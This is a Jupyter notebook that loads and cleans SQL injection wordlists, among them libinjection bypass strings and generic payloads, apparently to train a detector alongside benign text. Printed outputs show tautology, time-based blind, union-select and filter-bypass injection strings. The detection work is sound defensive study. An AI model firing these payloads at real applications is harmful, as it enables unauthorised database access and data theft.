{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "846d6c8e",
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "[nltk_data] Downloading package punkt to\n",
      "[nltk_data]     C:\\Users\\tanuj\\AppData\\Roaming\\nltk_data...\n",
      "[nltk_data]   Package punkt is already up-to-date!\n",
      "[nltk_data] Downloading package stopwords to\n",
      "[nltk_data]     C:\\Users\\tanuj\\AppData\\Roaming\\nltk_data...\n",
      "[nltk_data]   Package stopwords is already up-to-date!\n",
      "[nltk_data] Downloading package wordnet to\n",
      "[nltk_data]     C:\\Users\\tanuj\\AppData\\Roaming\\nltk_data...\n",
      "[nltk_data]   Package wordnet is already up-to-date!\n"
     ]
    }
   ],
   "source": [
    "import glob\n",
    "import time\n",
    "import pandas as pd\n",
    "# from xml.dom import minidom\n",
    "from nltk import ngrams\n",
    "from nltk.tokenize import sent_tokenize\n",
    "import nltk\n",
    "nltk.download('punkt')\n",
    "nltk.download('stopwords')\n",
    "nltk.download('wordnet')\n",
    "from nltk.stem import PorterStemmer\n",
    "from nltk.stem import PorterStemmer\n",
    "from nltk.tokenize import sent_tokenize, word_tokenize\n",
    "from nltk.stem import WordNetLemmatizer\n",
    "from nltk.corpus import stopwords \n",
    "from nltk.tokenize import word_tokenize"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "id": "97de982b",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Collecting package metadata (current_repodata.json): ...working... done\n",
      "Solving environment: ...working... done\n",
      "\n",
      "# All requested packages already installed.\n",
      "\n",
      "\n",
      "Note: you may need to restart the kernel to use updated packages.\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "\n",
      "\n",
      "==> WARNING: A newer version of conda exists. <==\n",
      "  current version: 23.7.4\n",
      "  latest version: 24.5.0\n",
      "\n",
      "Please update conda by running\n",
      "\n",
      "    $ conda update -n base -c defaults conda\n",
      "\n",
      "Or to minimize the number of packages updated during conda update use\n",
      "\n",
      "     conda install conda=24.5.0\n",
      "\n",
      "\n"
     ]
    }
   ],
   "source": [
    "conda install jupyter notebook"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "id": "29418b20",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Requirement already satisfied: tensorflow in c:\\users\\tanuj\\anaconda3\\lib\\site-packages\\tensorflow-2.16.1-py3.11-win-amd64.egg (2.16.1)\n",
      "Requirement already satisfied: tensorflow-intel==2.16.1 in c:\\users\\tanuj\\anaconda3\\lib\\site-packages (from tensorflow) (2.16.1)\n",
      "Requirement already satisfied: absl-py>=1.0.0 in c:\\users\\tanuj\\anaconda3\\lib\\site-packages (from tensorflow-intel==2.16.1->tensorflow) (2.1.0)\n",
      "Requirement already satisfied: astunparse>=1.6.0 in c:\\users\\tanuj\\anaconda3\\lib\\site-packages (from tensorflow-intel==2.16.1->tensorflow) (1.6.3)\n",
      "Requirement already satisfied: flatbuffers>=23.5.26 in c:\\users\\tanuj\\anaconda3\\lib\\site-packages (from tensorflow-intel==2.16.1->tensorflow) (23.5.26)\n",
      "Requirement already satisfied: gast!=0.5.0,!=0.5.1,!=0.5.2,>=0.2.1 in c:\\users\\tanuj\\anaconda3\\lib\\site-packages (from tensorflow-intel==2.16.1->tensorflow) (0.5.4)\n",
      "Requirement already satisfied: google-pasta>=0.1.1 in c:\\users\\tanuj\\anaconda3\\lib\\site-packages (from tensorflow-intel==2.16.1->tensorflow) (0.2.0)\n",
      "Requirement already satisfied: h5py>=3.10.0 in c:\\users\\tanuj\\anaconda3\\lib\\site-packages (from tensorflow-intel==2.16.1->tensorflow) (3.11.0)\n",
      "Requirement already satisfied: libclang>=13.0.0 in c:\\users\\tanuj\\anaconda3\\lib\\site-packages (from tensorflow-intel==2.16.1->tensorflow) (16.0.6)\n",
      "Requirement already satisfied: ml-dtypes~=0.3.1 in c:\\users\\tanuj\\anaconda3\\lib\\site-packages (from tensorflow-intel==2.16.1->tensorflow) (0.3.2)\n",
      "Requirement already satisfied: opt-einsum>=2.3.2 in c:\\users\\tanuj\\anaconda3\\lib\\site-packages (from tensorflow-intel==2.16.1->tensorflow) (3.3.0)\n",
      "Requirement already satisfied: packaging in c:\\users\\tanuj\\anaconda3\\lib\\site-packages (from tensorflow-intel==2.16.1->tensorflow) (23.1)\n",
      "Requirement already satisfied: protobuf!=4.21.0,!=4.21.1,!=4.21.2,!=4.21.3,!=4.21.4,!=4.21.5,<5.0.0dev,>=3.20.3 in c:\\users\\tanuj\\anaconda3\\lib\\site-packages (from tensorflow-intel==2.16.1->tensorflow) (4.25.3)\n",
      "Requirement already satisfied: requests<3,>=2.21.0 in c:\\users\\tanuj\\anaconda3\\lib\\site-packages (from tensorflow-intel==2.16.1->tensorflow) (2.31.0)\n",
      "Requirement already satisfied: setuptools in c:\\users\\tanuj\\anaconda3\\lib\\site-packages (from tensorflow-intel==2.16.1->tensorflow) (68.0.0)\n",
      "Requirement already satisfied: six>=1.12.0 in c:\\users\\tanuj\\anaconda3\\lib\\site-packages (from tensorflow-intel==2.16.1->tensorflow) (1.16.0)\n",
      "Requirement already satisfied: termcolor>=1.1.0 in c:\\users\\tanuj\\anaconda3\\lib\\site-packages (from tensorflow-intel==2.16.1->tensorflow) (2.4.0)\n",
      "Requirement already satisfied: typing-extensions>=3.6.6 in c:\\users\\tanuj\\anaconda3\\lib\\site-packages (from tensorflow-intel==2.16.1->tensorflow) (4.7.1)\n",
      "Requirement already satisfied: wrapt>=1.11.0 in c:\\users\\tanuj\\anaconda3\\lib\\site-packages (from tensorflow-intel==2.16.1->tensorflow) (1.14.1)\n",
      "Requirement already satisfied: grpcio<2.0,>=1.24.3 in c:\\users\\tanuj\\anaconda3\\lib\\site-packages (from tensorflow-intel==2.16.1->tensorflow) (1.62.0)\n",
      "Requirement already satisfied: tensorboard<2.17,>=2.16 in c:\\users\\tanuj\\anaconda3\\lib\\site-packages (from tensorflow-intel==2.16.1->tensorflow) (2.16.2)\n",
      "Requirement already satisfied: keras>=3.0.0 in c:\\users\\tanuj\\anaconda3\\lib\\site-packages (from tensorflow-intel==2.16.1->tensorflow) (3.3.3)\n",
      "Requirement already satisfied: tensorflow-io-gcs-filesystem>=0.23.1 in c:\\users\\tanuj\\anaconda3\\lib\\site-packages (from tensorflow-intel==2.16.1->tensorflow) (0.31.0)\n",
      "Requirement already satisfied: numpy<2.0.0,>=1.23.5 in c:\\users\\tanuj\\anaconda3\\lib\\site-packages (from tensorflow-intel==2.16.1->tensorflow) (1.24.3)\n",
      "Requirement already satisfied: wheel<1.0,>=0.23.0 in c:\\users\\tanuj\\anaconda3\\lib\\site-packages (from astunparse>=1.6.0->tensorflow-intel==2.16.1->tensorflow) (0.38.4)\n",
      "Requirement already satisfied: rich in c:\\users\\tanuj\\anaconda3\\lib\\site-packages (from keras>=3.0.0->tensorflow-intel==2.16.1->tensorflow) (13.7.1)\n",
      "Requirement already satisfied: namex in c:\\users\\tanuj\\anaconda3\\lib\\site-packages (from keras>=3.0.0->tensorflow-intel==2.16.1->tensorflow) (0.0.8)\n",
      "Requirement already satisfied: optree in c:\\users\\tanuj\\anaconda3\\lib\\site-packages (from keras>=3.0.0->tensorflow-intel==2.16.1->tensorflow) (0.11.0)\n",
      "Requirement already satisfied: charset-normalizer<4,>=2 in c:\\users\\tanuj\\anaconda3\\lib\\site-packages (from requests<3,>=2.21.0->tensorflow-intel==2.16.1->tensorflow) (2.0.4)\n",
      "Requirement already satisfied: idna<4,>=2.5 in c:\\users\\tanuj\\anaconda3\\lib\\site-packages (from requests<3,>=2.21.0->tensorflow-intel==2.16.1->tensorflow) (3.4)\n",
      "Requirement already satisfied: urllib3<3,>=1.21.1 in c:\\users\\tanuj\\anaconda3\\lib\\site-packages (from requests<3,>=2.21.0->tensorflow-intel==2.16.1->tensorflow) (1.26.16)\n",
      "Requirement already satisfied: certifi>=2017.4.17 in c:\\users\\tanuj\\anaconda3\\lib\\site-packages (from requests<3,>=2.21.0->tensorflow-intel==2.16.1->tensorflow) (2024.6.2)\n",
      "Requirement already satisfied: markdown>=2.6.8 in c:\\users\\tanuj\\anaconda3\\lib\\site-packages (from tensorboard<2.17,>=2.16->tensorflow-intel==2.16.1->tensorflow) (3.4.1)\n",
      "Requirement already satisfied: tensorboard-data-server<0.8.0,>=0.7.0 in c:\\users\\tanuj\\anaconda3\\lib\\site-packages (from tensorboard<2.17,>=2.16->tensorflow-intel==2.16.1->tensorflow) (0.7.2)\n",
      "Requirement already satisfied: werkzeug>=1.0.1 in c:\\users\\tanuj\\anaconda3\\lib\\site-packages (from tensorboard<2.17,>=2.16->tensorflow-intel==2.16.1->tensorflow) (2.2.3)\n",
      "Requirement already satisfied: MarkupSafe>=2.1.1 in c:\\users\\tanuj\\anaconda3\\lib\\site-packages (from werkzeug>=1.0.1->tensorboard<2.17,>=2.16->tensorflow-intel==2.16.1->tensorflow) (2.1.1)\n",
      "Requirement already satisfied: markdown-it-py>=2.2.0 in c:\\users\\tanuj\\anaconda3\\lib\\site-packages (from rich->keras>=3.0.0->tensorflow-intel==2.16.1->tensorflow) (2.2.0)\n",
      "Requirement already satisfied: pygments<3.0.0,>=2.13.0 in c:\\users\\tanuj\\anaconda3\\lib\\site-packages (from rich->keras>=3.0.0->tensorflow-intel==2.16.1->tensorflow) (2.15.1)\n",
      "Requirement already satisfied: mdurl~=0.1 in c:\\users\\tanuj\\anaconda3\\lib\\site-packages (from markdown-it-py>=2.2.0->rich->keras>=3.0.0->tensorflow-intel==2.16.1->tensorflow) (0.1.0)\n",
      "Note: you may need to restart the kernel to use updated packages.\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "DEPRECATION: Loading egg at c:\\users\\tanuj\\anaconda3\\lib\\site-packages\\apache_beam-2.56.0-py3.11-win-amd64.egg is deprecated. pip 23.3 will enforce this behaviour change. A possible replacement is to use pip for package installation..\n",
      "DEPRECATION: Loading egg at c:\\users\\tanuj\\anaconda3\\lib\\site-packages\\avro_python3-1.10.2-py3.11.egg is deprecated. pip 23.3 will enforce this behaviour change. A possible replacement is to use pip for package installation..\n",
      "DEPRECATION: Loading egg at c:\\users\\tanuj\\anaconda3\\lib\\site-packages\\contextlib2-21.6.0-py3.11.egg is deprecated. pip 23.3 will enforce this behaviour change. A possible replacement is to use pip for package installation..\n",
      "DEPRECATION: Loading egg at c:\\users\\tanuj\\anaconda3\\lib\\site-packages\\cython-3.0.10-py3.11.egg is deprecated. pip 23.3 will enforce this behaviour change. A possible replacement is to use pip for package installation..\n",
      "DEPRECATION: Loading egg at c:\\users\\tanuj\\anaconda3\\lib\\site-packages\\lvis-0.5.3-py3.11.egg is deprecated. pip 23.3 will enforce this behaviour change. A possible replacement is to use pip for package installation..\n",
      "DEPRECATION: Loading egg at c:\\users\\tanuj\\anaconda3\\lib\\site-packages\\matplotlib-3.9.0rc2-py3.11-win-amd64.egg is deprecated. pip 23.3 will enforce this behaviour change. A possible replacement is to use pip for package installation..\n",
      "DEPRECATION: Loading egg at c:\\users\\tanuj\\anaconda3\\lib\\site-packages\\object_detection-0.1-py3.11.egg is deprecated. pip 23.3 will enforce this behaviour change. A possible replacement is to use pip for package installation..\n",
      "DEPRECATION: Loading egg at c:\\users\\tanuj\\anaconda3\\lib\\site-packages\\portalocker-2.8.2-py3.11.egg is deprecated. pip 23.3 will enforce this behaviour change. A possible replacement is to use pip for package installation..\n",
      "DEPRECATION: Loading egg at c:\\users\\tanuj\\anaconda3\\lib\\site-packages\\pycocotools-2.0.7-py3.11-win-amd64.egg is deprecated. pip 23.3 will enforce this behaviour change. A possible replacement is to use pip for package installation..\n",
      "DEPRECATION: Loading egg at c:\\users\\tanuj\\anaconda3\\lib\\site-packages\\pyparsing-2.4.7-py3.11.egg is deprecated. pip 23.3 will enforce this behaviour change. A possible replacement is to use pip for package installation..\n",
      "DEPRECATION: Loading egg at c:\\users\\tanuj\\anaconda3\\lib\\site-packages\\sacrebleu-2.2.0-py3.11.egg is deprecated. pip 23.3 will enforce this behaviour change. A possible replacement is to use pip for package installation..\n",
      "DEPRECATION: Loading egg at c:\\users\\tanuj\\anaconda3\\lib\\site-packages\\tensorflow-2.16.1-py3.11-win-amd64.egg is deprecated. pip 23.3 will enforce this behaviour change. A possible replacement is to use pip for package installation..\n",
      "DEPRECATION: Loading egg at c:\\users\\tanuj\\anaconda3\\lib\\site-packages\\tensorflow_io-0.31.0-py3.11-win-amd64.egg is deprecated. pip 23.3 will enforce this behaviour change. A possible replacement is to use pip for package installation..\n",
      "DEPRECATION: Loading egg at c:\\users\\tanuj\\anaconda3\\lib\\site-packages\\tf_keras-2.16.0-py3.11.egg is deprecated. pip 23.3 will enforce this behaviour change. A possible replacement is to use pip for package installation..\n",
      "DEPRECATION: Loading egg at c:\\users\\tanuj\\anaconda3\\lib\\site-packages\\tf_models_official-2.16.0-py3.11.egg is deprecated. pip 23.3 will enforce this behaviour change. A possible replacement is to use pip for package installation..\n",
      "DEPRECATION: Loading egg at c:\\users\\tanuj\\anaconda3\\lib\\site-packages\\tf_slim-1.1.0-py3.11.egg is deprecated. pip 23.3 will enforce this behaviour change. A possible replacement is to use pip for package installation..\n"
     ]
    }
   ],
   "source": [
    "pip install tensorflow"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "id": "f5f7a135",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Note: you may need to restart the kernel to use updated packages.\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "ERROR: Could not find a version that satisfies the requirement tensorflow==1.2.0 (from versions: 2.12.0rc0, 2.12.0rc1, 2.12.0, 2.12.1, 2.13.0rc0, 2.13.0rc1, 2.13.0rc2, 2.13.0, 2.13.1, 2.14.0rc0, 2.14.0rc1, 2.14.0, 2.14.1, 2.15.0rc0, 2.15.0rc1, 2.15.0, 2.15.1, 2.16.0rc0, 2.16.1)\n",
      "ERROR: No matching distribution found for tensorflow==1.2.0\n"
     ]
    }
   ],
   "source": [
    "pip install tensorflow==1.2.0 --ignore-installed"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "id": "a1a23ed0",
   "metadata": {},
   "outputs": [],
   "source": [
    "import tensorflow as tf\n",
    "from tensorflow import keras"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "id": "a33467b7",
   "metadata": {},
   "outputs": [],
   "source": [
    "import nltk\n",
    "import pandas as pd\n",
    "import os"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "id": "ac3b1a1d",
   "metadata": {},
   "outputs": [],
   "source": [
    "def clean_sqli_data(data):\n",
    "    \n",
    "    for i in range(len(data)):\n",
    "        \n",
    "        data[i]=data[i].replace('\\n', '')\n",
    "        data[i]=data[i].replace('%20', ' ')\n",
    "        data[i]=data[i].replace('=', ' = ')\n",
    "        data[i]=data[i].replace('((', ' (( ')\n",
    "        data[i]=data[i].replace('))', ' )) ')\n",
    "        data[i]=data[i].replace('(', ' ( ')\n",
    "        data[i]=data[i].replace(')', ' ) ')\n",
    "    \n",
    "    return data"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "id": "fdba7d56",
   "metadata": {},
   "outputs": [],
   "source": [
    "path='C:/Users/tanuj/Downloads/sqli.txt'"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "id": "dae3d3b3",
   "metadata": {},
   "outputs": [],
   "source": [
    "sql_lines_fuzzing=[]\n",
    "f = open(path, \"r\")\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "id": "6ddf484b",
   "metadata": {},
   "outputs": [],
   "source": [
    " for x in f:\n",
    "    sql_lines_fuzzing.append(x)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "id": "7ff491dd",
   "metadata": {},
   "outputs": [],
   "source": [
    "sql_lines_fuzzing=clean_sqli_data(sql_lines_fuzzing) "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "id": "e85dae23",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[\"'sqlvuln\",\n",
       " \"'+sqlvuln\",\n",
       " 'sqlvuln;',\n",
       " ' ( sqlvuln ) ',\n",
       " \"a' or 1 = 1--\",\n",
       " '\"a\"\" or 1 = 1--\"',\n",
       " ' or a  =  a',\n",
       " \"a' or 'a'  =  'a\",\n",
       " '1 or 1 = 1',\n",
       " \"a' waitfor delay '0:0:10'--\",\n",
       " \"1 waitfor delay '0:0:10'--\",\n",
       " 'declare @q nvarchar  ( 4000 )  select @q  = ',\n",
       " '0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A',\n",
       " '0',\n",
       " '031003000270000']"
      ]
     },
     "execution_count": 16,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "sql_lines_fuzzing[:15]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "id": "e2b126c4",
   "metadata": {},
   "outputs": [],
   "source": [
    "path=\"C:/Users/tanuj/Downloads/camoufl4g3.txt\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "id": "454b9d18",
   "metadata": {},
   "outputs": [],
   "source": [
    "# read data from file\n",
    "\n",
    "sql_lines_camoufl4g3=[]\n",
    "f = open(path, \"r\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "id": "4675dfc6",
   "metadata": {},
   "outputs": [],
   "source": [
    "for x in f:\n",
    "    sql_lines_camoufl4g3.append(x)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "id": "010cdf6c",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[\"'-'\\n\",\n",
       " \"' '\\n\",\n",
       " \"'&'\\n\",\n",
       " \"'^'\\n\",\n",
       " \"'*'\\n\",\n",
       " \"' or ''-'\\n\",\n",
       " \"' or '' '\\n\",\n",
       " \"' or ''&'\\n\",\n",
       " \"' or ''^'\\n\",\n",
       " \"' or ''*'\\n\",\n",
       " '\"-\"\\n',\n",
       " '\" \"\\n',\n",
       " '\"&\"\\n',\n",
       " '\"^\"\\n',\n",
       " '\"*\"\\n']"
      ]
     },
     "execution_count": 20,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "sql_lines_camoufl4g3[:15] # data before cleaning\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "id": "dbc616dc",
   "metadata": {},
   "outputs": [],
   "source": [
    "sql_lines_camoufl4g3=clean_sqli_data(sql_lines_camoufl4g3)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "id": "45592cd9",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[\"'-'\",\n",
       " \"' '\",\n",
       " \"'&'\",\n",
       " \"'^'\",\n",
       " \"'*'\",\n",
       " \"' or ''-'\",\n",
       " \"' or '' '\",\n",
       " \"' or ''&'\",\n",
       " \"' or ''^'\",\n",
       " \"' or ''*'\",\n",
       " '\"-\"',\n",
       " '\" \"',\n",
       " '\"&\"',\n",
       " '\"^\"',\n",
       " '\"*\"']"
      ]
     },
     "execution_count": 22,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "sql_lines_camoufl4g3[:15]  # data after cleaning"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 23,
   "id": "a32d2c36",
   "metadata": {},
   "outputs": [],
   "source": [
    "path=\"C:/Users/tanuj/Downloads/libinjection-bypasses.txt\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 24,
   "id": "54994495",
   "metadata": {},
   "outputs": [],
   "source": [
    "# read data from file\n",
    "\n",
    "sql_lines_bypasses=[]\n",
    "f = open(path, \"r\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 25,
   "id": "f0799cfe",
   "metadata": {},
   "outputs": [],
   "source": [
    "for x in f:\n",
    "    sql_lines_bypasses.append(x)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 26,
   "id": "3c994f2d",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['&()o1: select * from users where id=1 or (\\\\)=1 union select 1,@@VERSION -- 1\\n',\n",
       " '&(.)o: select * from users where id=1 or (\\\\.)=1 union select 1,@@VERSION -- 1\\n',\n",
       " '&(1&1: select * from users where id=1 or (\\\\+)=1 or 1=1 -- 1\\n',\n",
       " '&(1)o: select * from users where id=1 or (1)=1 union select 1,banner from v$version where rownum=1 -- 1\\n',\n",
       " '&(1UE: select * from users where id=1 or (\\\\+)=1 union select 1,@@VERSION -- 1\\n']"
      ]
     },
     "execution_count": 26,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "sql_lines_bypasses[:5] # before cleaning\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 27,
   "id": "5034def7",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "474\n"
     ]
    }
   ],
   "source": [
    "print(len(sql_lines_bypasses))\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 28,
   "id": "2d3ec69f",
   "metadata": {},
   "outputs": [],
   "source": [
    "sql_lines_bypasses=clean_sqli_data(sql_lines_bypasses)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 29,
   "id": "3f5a985a",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['& (  ) o1: select * from users where id = 1 or  ( \\\\ )  = 1 union select 1,@@VERSION -- 1',\n",
       " '& ( . ) o: select * from users where id = 1 or  ( \\\\. )  = 1 union select 1,@@VERSION -- 1',\n",
       " '& ( 1&1: select * from users where id = 1 or  ( \\\\+ )  = 1 or 1 = 1 -- 1',\n",
       " '& ( 1 ) o: select * from users where id = 1 or  ( 1 )  = 1 union select 1,banner from v$version where rownum = 1 -- 1',\n",
       " '& ( 1UE: select * from users where id = 1 or  ( \\\\+ )  = 1 union select 1,@@VERSION -- 1']"
      ]
     },
     "execution_count": 29,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "sql_lines_bypasses[:5]  # data after cleaning"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 30,
   "id": "124b9ea1",
   "metadata": {},
   "outputs": [],
   "source": [
    "# if don't want &(*)* sign in beginning of each sentence then run next code else don't\n",
    "\n",
    "for i in range(len(sql_lines_bypasses)):\n",
    "    sentence=sql_lines_bypasses[i]\n",
    "    sql_lines_bypasses[i]=sentence.split(':')[1]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 31,
   "id": "7638acd4",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[' select * from users where id = 1 or  ( \\\\ )  = 1 union select 1,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 or  ( \\\\. )  = 1 union select 1,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 or  ( \\\\+ )  = 1 or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or  ( 1 )  = 1 union select 1,banner from v$version where rownum = 1 -- 1',\n",
       " ' select * from users where id = 1 or  ( \\\\+ )  = 1 union select 1,@@VERSION -- 1']"
      ]
     },
     "execution_count": 31,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "sql_lines_bypasses[:5]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 32,
   "id": "aadac318",
   "metadata": {},
   "outputs": [],
   "source": [
    "path=\"C:/Users/tanuj/Downloads/Generic-SQLi.txt\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 33,
   "id": "5a67af3e",
   "metadata": {},
   "outputs": [],
   "source": [
    "# read data from file\n",
    "\n",
    "sql_lines_Generic=[]\n",
    "f = open(path, \"r\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 34,
   "id": "ffc98a27",
   "metadata": {},
   "outputs": [],
   "source": [
    "for x in f:\n",
    "    sql_lines_Generic.append(x)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 35,
   "id": "dad53456",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[\")%20or%20('x'='x\\n\",\n",
       " '%20or%201=1\\n',\n",
       " \"; execute immediate 'sel' || 'ect us' || 'er'\\n\",\n",
       " 'benchmark(10000000,MD5(1))#\\n',\n",
       " 'update\\n',\n",
       " '\";waitfor delay \\'0:0:__TIME__\\'--\\n',\n",
       " '1) or pg_sleep(__TIME__)--\\n',\n",
       " '||(elt(-3+5,bin(15),ord(10),hex(char(45))))\\n',\n",
       " '\"hi\"\") or (\"\"a\"\"=\"\"a\"\\n',\n",
       " 'delete\\n',\n",
       " 'like\\n',\n",
       " '\" or sleep(__TIME__)#\\n',\n",
       " 'pg_sleep(__TIME__)--\\n',\n",
       " '*(|(objectclass=*))\\n',\n",
       " 'declare @q nvarchar (200) 0x730065006c00650063 ...\\n']"
      ]
     },
     "execution_count": 35,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "sql_lines_Generic[:15] # before cleaning"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 36,
   "id": "4ae27b8d",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "267\n"
     ]
    }
   ],
   "source": [
    "print(len(sql_lines_Generic))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 37,
   "id": "cee50ff8",
   "metadata": {},
   "outputs": [],
   "source": [
    "sql_lines_Generic=clean_sqli_data(sql_lines_Generic)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 38,
   "id": "8fab48ea",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[\" )  or  ( 'x' = 'x\",\n",
       " ' or 1 = 1',\n",
       " \"; execute immediate 'sel' || 'ect us' || 'er'\",\n",
       " 'benchmark ( 10000000,MD5 ( 1  )  )  #',\n",
       " 'update',\n",
       " '\";waitfor delay \\'0:0:__TIME__\\'--',\n",
       " '1 )  or pg_sleep ( __TIME__ ) --',\n",
       " '|| ( elt ( -3+5,bin ( 15 ) ,ord ( 10 ) ,hex ( char ( 45  )  )    )  )  ',\n",
       " '\"hi\"\" )  or  ( \"\"a\"\" = \"\"a\"',\n",
       " 'delete',\n",
       " 'like',\n",
       " '\" or sleep ( __TIME__ ) #',\n",
       " 'pg_sleep ( __TIME__ ) --',\n",
       " '* ( | ( objectclass = *  )  )  ',\n",
       " 'declare @q nvarchar  ( 200 )  0x730065006c00650063 ...']"
      ]
     },
     "execution_count": 38,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "sql_lines_Generic[:15] # after cleaning"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 39,
   "id": "6a26d50b",
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "[nltk_data] Downloading package stopwords to\n",
      "[nltk_data]     C:\\Users\\tanuj\\AppData\\Roaming\\nltk_data...\n",
      "[nltk_data]   Package stopwords is already up-to-date!\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 39,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "nltk.download('stopwords')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 40,
   "id": "2e2c57c6",
   "metadata": {},
   "outputs": [],
   "source": [
    "from nltk.corpus import stopwords"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 41,
   "id": "bccdf260",
   "metadata": {},
   "outputs": [],
   "source": [
    "# function to remove stopwords\n",
    "\n",
    "stop_words = set(stopwords.words('english')) \n",
    "\n",
    "def fun_remove_stop_words(posts):\n",
    "\n",
    "    filtered=''\n",
    "    \n",
    "    for x in posts.split(' '):\n",
    "        if x not in stop_words:\n",
    "            filtered+=' '+x\n",
    "    \n",
    "    return filtered"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 44,
   "id": "8338b727",
   "metadata": {},
   "outputs": [],
   "source": [
    "path=\"C:/Users/tanuj/Downloads/\"\n",
    "file=\"plain.txt\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 45,
   "id": "d73f0b8a",
   "metadata": {},
   "outputs": [],
   "source": [
    "#read benign data\n",
    "\n",
    "df = pd.read_csv(os.path.join(path,file), sep='Aw3s0meSc0t7', names=['benign'], header=None, engine='python')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 46,
   "id": "32721c29",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>benign</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>Add plain text here</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>“Ne te quaesiveris extra.”</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>“Man is his own star; and the soul that can</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>Render an honest and a perfect man,</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
